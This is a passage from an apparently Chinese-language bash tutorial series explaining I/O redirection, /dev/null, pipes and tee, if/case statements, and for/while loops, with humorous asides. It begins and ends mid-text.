2&gt;file.both</span></span><br></pre></td></tr></table></figure><p>假如<code>stdout</code>(1)与<code>stderr</code>(2)都同时在写入file.both的话，则是采取覆盖的方式：后来写入覆盖前面的。</p><p>让我们假设一个<code>stdout</code>与<code>stderr</code>同时写入到file.out的情形好了；</p><ul><li>首先<code>stdout</code>写入10个字符</li><li>然后<code>stderr</code>写入6个字符</li></ul><p>那么，这时原本的<code>stdout</code>输出的10个字符，将被<code>stderr</code>输出的6个字符覆盖掉了。</p><p>那如何解决呢？所谓山不转路转，路不转人转嘛，我们可以换一个思维：<br>将<code>stderr</code>导进<code>stdout</code><br>或者将<code>stdout</code>导进到<code>stderr</code>，而不是大家在抢同一份文件，不就行了。<br>bingo就是这样啦：</p><ul><li>2&gt;&amp;1 #将<code>stderr</code>并进<code>stdout</code>输出</li><li>1&gt;&amp;2 或者 &gt;&amp;2 #将<code>stdout</code>并进<code>stderr</code>输出。</li></ul><p>于是，前面的错误操作可以改写为:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file 1&gt;file.both 2&gt;&amp;1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file 2&gt;file.both &gt;&amp;2</span></span><br></pre></td></tr></table></figure></p><p>这样，不就皆大欢喜了吗？ ^_^</p><p>不过，光解决了同时写入的问题还不够，我们还有其他技巧需要了解的。<br>故事还没有结束，别走开广告后，我们在回来….</p><hr><h4 id="2-3-I-O重定向与linux中的-dev-null"><a href="#2-3-I-O重定向与linux中的-dev-null" class="headerlink" title="2.3 I/O重定向与linux中的 /dev/null"></a>2.3 I/O重定向与linux中的 /dev/null</h4><hr><p>ok，这次不讲I/O Redirection, 请佛吧。</p><p>学佛的最高境界，就是<strong>四大皆空</strong>。<br>至于是空哪四大块，我也不知，因为我还没有到那个境界。<br>这个<strong>空</strong>字,却非常值得反复把玩：<strong>色即是空，空即是色</strong><br>好了，施主要是能够领会<strong>空</strong>的禅意，那离修成正果不远了。</p><p>在linux的文件系统中，有个设备文件: <code>/dev/null</code>，许多人都问过我，那是什么玩意儿？<br>我跟你说好了，那就是<strong>空</strong>啦。</p><p>没错空空如也的空就是null了，请问施主是否忽然有所顿悟了呢？<br>然则恭喜了。</p><p>这个null在 I/O Redirection中可有用的很呢？</p><ul><li>将fd <code>1</code>跟fd <code>2</code>重定向到/dev/null去，就可忽略stdout, stderr的输出。</li><li>将fd <code>0</code>重定向到/dev/null，那就是读进空(nothing).</li></ul><p>比方说，我们在执行一个进程时，会同时输出到stdout与stderr，假如你不想看到stderr(也不想存到文件)， 那就可以：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file 2&gt;/dev/null</span></span><br><span class="line">my.file</span><br></pre></td></tr></table></figure></p><p>若要相反：只想看到stderr呢？<br>还不简单将stdout，重定向的/dev/null就行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file &gt;/dev/null</span></span><br><span class="line">ls: no.such.file: No such file or directory</span><br></pre></td></tr></table></figure></p><p>那接下来，假如单纯的只跑进程，而不想看到任何输出呢？<br>哦，这里留了一手，上次没讲的法子,专门赠与有缘人… ^_^<br>除了用 <code>&gt;/dev/null 2&gt;&amp;1</code>之外，你还可以如此：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file &amp;&gt;/dev/null</span></span><br></pre></td></tr></table></figure></p><blockquote><p><strong>Tips:</strong></p></blockquote><blockquote><p>将&amp;&gt;换成&gt;&amp;也行！</p></blockquote><hr><h4 id="2-4-重定向输出append-gt-gt"><a href="#2-4-重定向输出append-gt-gt" class="headerlink" title="2.4 重定向输出append (&gt;&gt;)"></a>2.4 重定向输出append (&gt;&gt;)</h4><hr><p>ok？ 请完佛，接下来，再让我们看看如下情况：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"1"</span> &gt; file.out</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat file.out</span></span><br><span class="line">1</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"2"</span> &gt; file.out</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat file.out</span></span><br><span class="line">2</span><br></pre></td></tr></table></figure></p><p>看来，我们在重定向stdout或stderr进一个文件时，似乎永远只能获得最后一次的重定向的结果，那之前的内容呢？<br>呵呵，要解决这个问题，很简单啦，将<code>&gt;</code>换成<code>&gt;&gt;</code> 就好了；<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"3"</span> &gt;&gt; file.out</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat file.out</span></span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p><p>如此一来，被重定向的文件的之前的内容并不会丢失，而新的内容则一直追加在最后面去。so easy?</p><p>但是，只要你再次使用<code>&gt;</code>来重定向输出的话，那么，原来文件的内容被truncated(清洗掉)。<br>这是，你要如何避免呢？<br>备份， yes，我听到了，不过，还有更好的吗？<br>既然与施主这么有缘分，老衲就送你一个锦囊妙法吧：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">set</span> -o noclobber</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"4"</span> &gt; file.out</span></span><br><span class="line">-bash：file: cannot overwrite existing file.</span><br></pre></td></tr></table></figure></p><ul><li><blockquote><p>那，要如何取消这个限制呢?</p></blockquote></li><li><blockquote><p>哦，将<code>set -o</code>换成 <code>set +o</code>就行了：</p></blockquote></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">set</span> +o noclobber</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"5"</span> &gt; file.out</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat file.out</span></span><br><span class="line">5</span><br></pre></td></tr></table></figure><ul><li><blockquote><p>再问：那有办法不取消而又临时改写目标文件吗？</p></blockquote></li><li><blockquote><p>哦，佛曰：不可告也。</p></blockquote></li><li><blockquote><p>啊，开玩笑的，开玩笑啦^_^，</p></blockquote></li><li><blockquote><p>哎，早就料到人心是不足的了</p></blockquote></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">set</span> -o noclobber</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"6"</span> &gt;| file.out</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat file.out</span></span><br><span class="line">6</span><br></pre></td></tr></table></figure><p>留意到没有：</p><blockquote><p>在<code>&gt;</code>后面加个<code>|</code>就好，注意： <code>&gt;</code>与<code>|</code>之间不能有空白哦。</p></blockquote><hr><h4 id="2-5-I-O-Redirection的优先级"><a href="#2-5-I-O-Redirection的优先级" class="headerlink" title="2.5 I/O Redirection的优先级"></a>2.5 I/O Redirection的优先级</h4><hr><p>呼….(深呼吸吐纳一下吧) ^_^ 再来还有一个难题要你去参透呢:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"some text here"</span> &gt;file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat &lt; file</span></span><br><span class="line">some text here</span><br><span class="line"><span class="meta">$</span><span class="bash">cat &lt; file &gt;file.bak</span></span><br><span class="line"><span class="meta">$</span><span class="bash">cat &lt; file.bak</span></span><br><span class="line">some text here</span><br><span class="line"><span class="meta">$</span><span class="bash">cat &lt; file &gt;file</span></span><br></pre></td></tr></table></figure></p><p>嗯？注意到没有？<br>怎么最后那个cat命令看到file是空的呢？<br>why？ why？ why？</p><p>前面提到：<code>$cat &lt; file &gt; file</code>之后，原本有内容的文件，结果却被清空了。<br>要理解这个现象其实不难，这只是priority的问题而已：</p><blockquote><p>在IO Redirection中, stdout与stderr的管道先准备好，才会从stdin读入数据。<br>也就是说，在上例中，<code>&gt;file</code>会将file清空，然后才读入 <code>&lt; file</code>。<br>但这时候文件的内容已被清空了，因此就变成了读不进任何数据。</p></blockquote><p>哦，原来如此^_^<br>那…如下两例又如何呢？<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat &lt;&gt; file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat &lt; file &gt;&gt;file</span></span><br></pre></td></tr></table></figure></p><p>嗯…同学们，这两个答案就当练习题喽，下课前交作业。</p><blockquote><p><strong>Tips:</strong><br>我们了解到<code>&gt;file</code>能够快速把文件file清空；<br>或者使用<code>:&gt;file</code>同样可以清空文件，<br><code>:&gt;file</code>与<code>&gt;file</code>的功能：<br>若文件file存在，则将file清空; 否则，创建空文件file (等效于<code>touch file</code>);<br>二者的差别在于<code>&gt;file</code>的方式不一定在所有的shell的都可用。</p></blockquote><blockquote><p><code>exec 5&lt;&gt;file; echo &quot;abcd&quot; &gt;&amp;5; cat &lt;&amp;5</code><br>将file文件的输入、输出定向到文件描述符5，<br>从而描述符5可以接管file的输入输出；<br>因此，<code>cat &lt;&gt;file</code>等价于<code>cat &lt; file</code>。</p><p>而<code>cat &lt; file &gt;&gt;file</code>则使file内容成几何级数增长。</p></blockquote><p>好了， I/O Redirection也快讲完了，<br>sorry,因为我也只知道这么多而已啦嘻^_^<br>不过，还有一样东东是一定要讲的，各位观众(请自行配乐~!#@$%):<br>就是<code>pipe line</code>也。</p><hr><h4 id="2-6-管道-pipe-line"><a href="#2-6-管道-pipe-line" class="headerlink" title="2.6 管道(pipe line)"></a>2.6 管道(pipe line)</h4><hr><p>谈到<code>pipe line</code>，我相信不少人都不会陌生：<br>我们在很多command line上常看到<code>|</code>符号就是pipe line了。</p><p>不过，pipe line究竟是什么东东呢？<br>别急别急…先查一下英文字典，看看pipe是什么意思？<br>没错他就是“水管”的意思…<br>那么，你能想象一下水管是怎样一个根接一根的吗？<br>又， 每根水管之间的input跟output又如何呢？<br>灵光一闪：原来pipe line的I/O跟水管的I/O是一模一样的：</p><blockquote><p>上一个命令的stdout接到下一个命令的stdin去了<br>的确如此。不管在command line上使用了多少个pipe line，前后两个command的I/O是彼此连接的(恭喜：你终于开放了 ^_^ )</p></blockquote><p>不过…然而…但是… …stderr呢？<br>好问题不过也容易理解：<br>若水管漏水怎么办？<br>也就是说：在pipe line之间, 前一个命令的stderr是不会接进下一个命令的stdin的，其输出，若不用2&gt;file的话，它还是送到monitor显示器上来。<br>这点请你在pipe line运用上务必要注意的。</p><p>那，或许你有会问:</p><ul><li><blockquote><p>有办法将stderr也喂进下一个命令的stdin吗？<br>(贪得无厌的家伙)，方法当然是有的，而且，你早已学习过了。<br>提示一下就好：请问你如何将stderr合并进stdout一同输出呢？<br>若你答不出来，下课后再来问我…(如果你脸皮足够厚的话…)</p></blockquote></li></ul><p>或许，你仍意犹未尽，或许，你曾经碰到过下面的问题：<br>在<code>cmd1 | cmd2 | cmd3 | ...</code>这段pipe line中如何将cmd2的输出保存到一个文件呢？</p><p>若你写成<code>cmd1 | cmd2 &gt;file | cmd3</code>的话，那你肯定会发现<code>cmd3</code>的stdin是空的，(当然了，你都将水管接到别的水池了)<br>聪明的你或许会如此解决：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd1 | cmd2 &gt;file; cmd3 &lt; file</span><br></pre></td></tr></table></figure></p><p>是的，你可以这样做，但最大的坏处是：<br>file I/O会变双倍，在command执行的整个过程中，file I/O是最常见的最大效能杀手。<br>凡是有经验的shell操作者，都会尽量避免或降低file I/O的频度。<br>那上面问题还有更好的方法吗？<br>有的，那就是<code>tee</code>命令了。<br>所谓的<code>tee</code>命令是在不影响原本I/O的情况下，将stdout赋值到一个文件中去。<br>因此，上面的命令行，可以如此执行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd1 | cmd2 | tee file | cmd3</span><br></pre></td></tr></table></figure></p><p>在预设上，<code>tee</code>会改写目标文件，若你要改为追加内容的话，那可用-a参数选项。<br>基本上，pipe line的应用在shell操作上是非常广泛的。<br>尤其是在text filtering方面，如，cat, more, head, tail, wc, expand, tr, grep, sed, awk…等等文字处理工具。<br>搭配起pipe line 来使用，你会觉得 command line原来活得如此精彩的。<br>常让人有“众里寻他千百度，蓦然回首，那人却在灯火阑珊处”之感。</p><p>好了，关于I/O Redirection的介绍就到此告一段落。<br>若日后，有空的话，在为大家介绍其他在shell上好玩的东西。</p><h2 id="shell十五问之12：你要if还是case呢？"><a href="#shell十五问之12：你要if还是case呢？" class="headerlink" title="shell十五问之12：你要if还是case呢？"></a>shell十五问之12：你要if还是case呢？</h2><hr><p>还记得我们在第10章所介绍的<code>return value</code>吗？</p><p>是的，接下来的介绍的内容与之有关，若你的记忆也被假期所抵消的话，那建议您还是回去温习温习再回来。</p><p>若你记得<code>return value</code>，我想你也应该记得了<code>&amp;&amp;</code> 与 <code>||</code> 什么意思吧?<br>用这两个符号再搭配 command group的话，我们可让shell script变得更加聪明哦。<br>比方说：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmd1 <span class="meta">&amp;&amp; &#123;</span></span><br><span class="line">    cmd2</span><br><span class="line">        cmd3</span><br><span class="line">        ;</span><br><span class="line">&#125; <span class="string">|| &#123;</span></span><br><span class="line">        cmd4</span><br><span class="line">        cmd5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>意思是说：<br>若 cmd1的<code>return value</code>为true的话，然后执行cmd2与cmd3，否则执行cmd4与cmd5。</p><p>事实上， 我们在写shell script的时候，经常需要用到这样、那样的条件以作出不同的处理动作。<br>用<code>&amp;&amp;</code>与<code>||</code>的确可以达成条件执行的结果，然而，从“人类语言”上来理解，却不是那么直观。<br>更多时候，我们还是喜欢用<code>if...then...else...</code>这样的的keyword来表达条件执行。</p><p>在bash shell中，我们可以如此修改上一段代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> cmd1</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        cmd2                                                                                                                               </span><br><span class="line">        cmd3                                                                                                                               </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        cmd4                                                                                                                               </span><br><span class="line">        cmd5                                                                                                                               </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p><p>这也是我们在shell script中最常用的<code>if</code>判断式：</p><blockquote><p>只要<code>if</code>后面的command line返回true的return value<br>(我们常用<code>test</code>命令返回的return value)，然则就执行<code>then</code>后面的命令，否则，执行<code>else</code>之后的命令， <code>fi</code>则是用来结束判断式的keyword。</p></blockquote><blockquote><p>在<code>if</code>的判断式中，<code>else</code>部分可以不用，但<code>then</code>是必需的。<br>(若<code>then</code>后不想跑任何command，可用<code>:</code>这个<code>null command</code>代替)。<br>当然，then或else后面，也可以再使用更进一层的条件判断式，这在shell script的设计上很常见。<br>若有多项条件需要”依序”进行判断的话，那我们则可使用<code>elif</code>这样的keyword：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> cmd1; <span class="keyword">then</span>                                                                                                                              </span><br><span class="line">    cmd2;</span><br><span class="line"><span class="keyword">elif</span> cmd3; <span class="keyword">then</span>                                                                                                                            </span><br><span class="line">        cmd4                                                                                                                               </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        cmd5                                                                                                                               </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p></blockquote><p>意思是说：</p><blockquote><pre><code>若cmd1为true，然则执行cmd2；否则在测试cmd3，若为true则执行cmd4；倘若cmd1与cmd3均不成立，那就执行cmd5。</code></pre></blockquote><p><code>if</code>判断式的例子很常见，你可从很多shell script中看得到，我这里不再举例子了。</p><p>接下来为要为大家介绍的是<code>case</code>判断式。<br>虽然<code>if</code>判断式已可应付大部分的条件执行了，然而，在某些场合中，却不够灵活，尤其是在string式样的判断上，<br>比方如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">QQ</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Do you want to continue? (Yes/No): "</span>                                                                                          </span><br><span class="line">        <span class="built_in">read</span> YN                                                                                                                            </span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">"<span class="variable">$YN</span>"</span> = Y -o <span class="string">"<span class="variable">$YN</span>"</span> = y -o <span class="string">"<span class="variable">$YN</span>"</span> = <span class="string">"Yes"</span> -o <span class="string">"<span class="variable">$YN</span>"</span> = <span class="string">"yes"</span> -o <span class="string">"<span class="variable">$YN</span>"</span> = YES]                                                      </span><br><span class="line">        <span class="keyword">then</span>                                                                                                                               </span><br><span class="line">                QQ                                                                                                                         </span><br><span class="line">        <span class="keyword">else</span>                                                                                                                               </span><br><span class="line">                <span class="built_in">exit</span> 0                                                                                                                     </span><br><span class="line">        <span class="keyword">fi</span>                                                                                                                                 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">QQ</span><br></pre></td></tr></table></figure></p><p>从例中，我们看得出来，最麻烦的部分是在判断YN的值可能有好几种样式。</p><p>聪明的你或许会如此修改：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="title">QQ</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">"Do you want to continue? (Yes/No): "</span>                                                                                      </span><br><span class="line">        <span class="built_in">read</span> YN                                                                                                                            </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">echo</span> <span class="string">"<span class="variable">$YN</span>"</span> | grep -q <span class="string">'^[Yy]\([Ee][Ss]\)*$'</span>                                                                                      </span><br><span class="line">        <span class="keyword">then</span>                                                                                                                               </span><br><span class="line">                QQ                                                                                                                         </span><br><span class="line">        <span class="keyword">else</span>                                                                                                                               </span><br><span class="line">                <span class="built_in">exit</span> 0                                                                                                                     </span><br><span class="line">        <span class="keyword">fi</span>                                                                                                                                 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">QQ</span><br></pre></td></tr></table></figure></p><p>也就是用<code>Regular Expression</code>来简化代码。<br>(我们有机会，再来介绍<code>RE</code>)<br>只是…是否有其他更方便的方法呢？有的，就是用<code>case</code>判断式即可：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="title">QQ</span></span>() &#123;                                                                                                                                    </span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">"Do you want to continue? (Yes/No): "</span>                                                                                      </span><br><span class="line">        <span class="built_in">read</span> YN                                                                                                                            </span><br><span class="line">        <span class="keyword">case</span> <span class="string">"<span class="variable">$YN</span>"</span> <span class="keyword">in</span>                                                                                                                      </span><br><span class="line">                [Yy]|[Yy][Ee][Ss])                                                                                                         </span><br><span class="line">                        QQ                                                                                                                 </span><br><span class="line">                        ;;                                                                                                                 </span><br><span class="line">                *)                                                                                                                         </span><br><span class="line">                        <span class="built_in">exit</span> 0                                                                                                             </span><br><span class="line">                        ;;                                                                                                                 </span><br><span class="line">        <span class="keyword">esac</span>                                                                                                                               </span><br><span class="line">&#125;                                                                                                                                          </span><br><span class="line">                                                                                                                                           </span><br><span class="line">QQ</span><br></pre></td></tr></table></figure></p><p>我们常用的<code>case</code>的判断式来判断某一变量在不同的值(通常是string)时，作出不同的处理，比方说，判断script参数，以执行不同的命令。<br>若你有兴趣，且用linux系统的话，不妨挖一挖<code>/etc/init.d/*</code>中的那堆script中的<code>case</code>用法。<br>如下就是一例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span>                                                                                                                               </span><br><span class="line">        start)                                                                                                                             </span><br><span class="line">                start                                                                                                                      </span><br><span class="line">                ;;                                                                                                                         </span><br><span class="line">        stop)                                                                                                                              </span><br><span class="line">                stop                                                                                                                       </span><br><span class="line">                ;;                                                                                                                         </span><br><span class="line">        status)                                                                                                                            </span><br><span class="line">                rhstatus                                                                                                                   </span><br><span class="line">                ;;                                                                                                                         </span><br><span class="line">        restart|reload)                                                                                                                    </span><br><span class="line">                restart                                                                                                                    </span><br><span class="line">                ;;                                                                                                                         </span><br><span class="line">        condrestart)                                                                                                                       </span><br><span class="line">                [ -f /var/lock/subsys/syslog ] &amp;&amp; restart || :                                                                             </span><br><span class="line">                ;;                                                                                                                         </span><br><span class="line"></span><br><span class="line">        *)</span><br><span class="line">                <span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|status|restart|condrestart&#125;"</span>                                                                  </span><br><span class="line">                <span class="built_in">exit</span> 1                                                                                                                     </span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure></p><p>(若你对 postional parameter的印象已经模糊了，请重看第9章吧。)</p><h2 id="shell十五问之13：-for-what？-while与until差在哪？"><a href="#shell十五问之13：-for-what？-while与until差在哪？" class="headerlink" title="shell十五问之13： for what？ while与until差在哪？"></a>shell十五问之13： for what？ while与until差在哪？</h2><hr><p>现在要介绍的是shell script设计中常见的<code>循环</code>(<code>loop</code>)，所谓的<code>loop</code>就是script中的一段在一定条件下反复执行的代码。</p><p>bash shell中常用的<code>loop</code>有如下三种：</p><ul><li>for</li><li>while</li><li>until</li></ul><h3 id="1-for-loop"><a href="#1-for-loop" class="headerlink" title="1. for loop"></a>1. for loop</h3><hr><p><code>for</code> loop 是从一个清单列表中读进变量的值，并依次的循环执行<code>do</code>到<code>done</code>之间的命令行。<br>例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> one two three four five                                                                                                         </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -----------------                                                                                                                 </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'$var is '</span><span class="variable">$var</span>                                                                                                                </span><br><span class="line">        <span class="built_in">echo</span>                                                                                                                               </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>上例的执行结果将会是：</p><blockquote><ol><li>for会定义一个叫var的变量，其值依次是one two three four five。</li></ol></blockquote><blockquote><ol start="2"><li>因为有5个变量值，因此，<code>do</code>与<code>done</code>之间的命令行会被循环执行5次。</li></ol></blockquote><blockquote><ol start="3"><li>每次循环均用<code>echo</code>产生3个句子。而第二行中不在hard quote之内的$var会被替换。</li></ol></blockquote><blockquote><ol start="4"><li>当最后一个变量值处理完毕，循环结束。</li></ol></blockquote><p>我们不难看出，在<code>for</code> loop中，变量值的多寡，决定循环的次数。<br>然而，变量在循环中是否使用则不一定，得视设计需求而定。<br>倘若<code>for</code> loop没有使用in这个keyword来制变量清单的话，其值将从<code>$@</code>(或<code>$*</code>)中继承：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> var; <span class="keyword">do</span></span><br><span class="line">        ......                                                                                                                             </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><blockquote><p><strong>Tips:</strong></p></blockquote><blockquote><p>若你忘记了`positional parameter, 请温习第9章…</p></blockquote><p><code>for</code> loop用于处理清单(list)项目非常方便，其清单除了明确指定或从<code>postional parameter</code>取得之外，也可以从<code>变量替换</code>或者<code>命令替换</code>取得。<br>(再一次提醒：别忘了命令行的“重组”特性)<br>然而，对于一些“累计变化”的项目(整数的加减)，for也能处理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i = 1; i &lt;= 10; i++))                                                                                                                </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"num is <span class="variable">$i</span>"</span>                                                                                                                   </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><h3 id="2-while-loop"><a href="#2-while-loop" class="headerlink" title="2. while loop"></a>2. while loop</h3><hr><p>除了<code>for</code> loop, 上面的例子，我们也可改用<code>while</code> loop来做到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="string">"<span class="variable">$num</span>"</span> -le 10 ]; <span class="keyword">do</span>                                                                                                                </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"num is <span class="variable">$num</span>"</span>                                                                                                                 </span><br><span class="line">        num=$((<span class="variable">$num</span> + 1))                                                                                                                  </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p><code>while</code> loop的原理与<code>for</code> loop稍有不同：<br>它不是逐次处理清单中的变量值，而是取决于<code>while</code> 后面的命令行的return value：</p><ul><li>若为true， 则执行<code>do</code>与<code>done</code>之间的命令，然后重新判断<code>while</code>后的return value。</li><li>若为false，则不再执行<code>do</code>与<code>done</code>之间的命令而结束循环。</li></ul><p>分析上例：</p><blockquote><ol><li>在<code>while</code>之前，定义变量num=1。</li></ol></blockquote><blockquote><ol start="2"><li>然后测试(<code>test</code>)$num是否小于或等于10。</li></ol></blockquote><blockquote><ol start="3"><li>结果为true，于是执行<code>echo</code>并将num的值加1。</li></ol></blockquote><blockquote><ol start="4"><li>再作第二轮测试，此时num的值为1+1=2，依然小于或等于10，因此，为true，循环继续。</li></ol></blockquote><blockquote><ol start="5"><li>直到num为10+1=11时，测试才会失败…于是结束循环。</li></ol></blockquote><p>我们不难发现：</p><blockquote><p>若<code>while</code>的测试结果永远为true的话，那循环将一直永久执行下去：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>:; <span 